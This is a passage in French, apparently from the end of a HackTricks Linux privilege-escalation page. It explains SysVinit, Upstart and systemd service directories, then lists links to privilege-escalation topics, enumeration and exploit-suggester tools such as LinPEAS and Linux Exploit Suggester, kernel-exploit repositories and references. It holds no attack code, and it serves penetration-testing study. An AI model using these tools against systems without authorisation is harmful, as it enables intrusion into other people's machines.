`/etc/init.d` contient des **scripts** utilisés par les outils d'initialisation System V (SysVinit). Il s'agit du **paquetage de gestion de services traditionnel pour Linux**, contenant le programme `init` (le premier processus qui est exécuté lorsque le noyau a terminé son initialisation¹) ainsi qu'une infrastructure pour démarrer et arrêter les services et les configurer. Plus précisément, les fichiers dans `/etc/init.d` sont des scripts shell qui répondent aux commandes `start`, `stop`, `restart` et (lorsqu'ils sont pris en charge) `reload` pour gérer un service particulier. Ces scripts peuvent être invoqués directement ou (le plus souvent) via un autre déclencheur (généralement la présence d'un lien symbolique dans `/etc/rc?.d/`). (À partir de [ici](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d)). Une autre alternative à ce dossier est `/etc/rc.d/init.d` dans Redhat.

`/etc/init` contient des fichiers de **configuration** utilisés par **Upstart**. Upstart est un jeune **paquetage de gestion de services** soutenu par Ubuntu. Les fichiers dans `/etc/init` sont des fichiers de configuration indiquant à Upstart comment et quand `start`, `stop`, `reload` la configuration ou interroger le `status` d'un service. À partir de Lucid, Ubuntu passe de SysVinit à Upstart, ce qui explique pourquoi de nombreux services sont accompagnés de scripts SysVinit même si les fichiers de configuration Upstart sont préférés. Les scripts SysVinit sont traités par une couche de compatibilité dans Upstart. (À partir de [ici](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d)).

**systemd** est un **système d'initialisation et un gestionnaire de services Linux qui inclut des fonctionnalités telles que le démarrage à la demande des démons**, la maintenance des points de montage et d'automontage, la prise en charge des instantanés et le suivi des processus à l'aide des groupes de contrôle Linux. systemd fournit un démon de journalisation et d'autres outils et utilitaires pour faciliter les tâches courantes d'administration système. (À partir de [ici](https://www.linode.com/docs/quick-answers/linux-essentials/what-is-systemd/)).

Les fichiers inclus dans les paquets téléchargés depuis le référentiel de distribution sont placés dans `/usr/lib/systemd/`. Les modifications effectuées par l'administrateur système (utilisateur) sont placées dans `/etc/systemd/system/`.

## Autres astuces

### Élévation de privilèges NFS

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### Échapper aux shells restreints

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## Protections de sécurité du noyau

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Plus d'aide

[Binaires impacket statiques](https://github.com/ropnop/impacket\_static\_binaries)

## Outils de privilège d'escalade Linux/Unix

### **Meilleur outil pour rechercher des vecteurs d'escalade de privilèges locaux Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(option -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Énumère les vulnérabilités du noyau dans Linux et MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (accès physique):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recueil de plus de scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Références

[https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\
[https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\
[https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\
[http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\
[https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\
[https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\
[https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\
[https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\
[https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
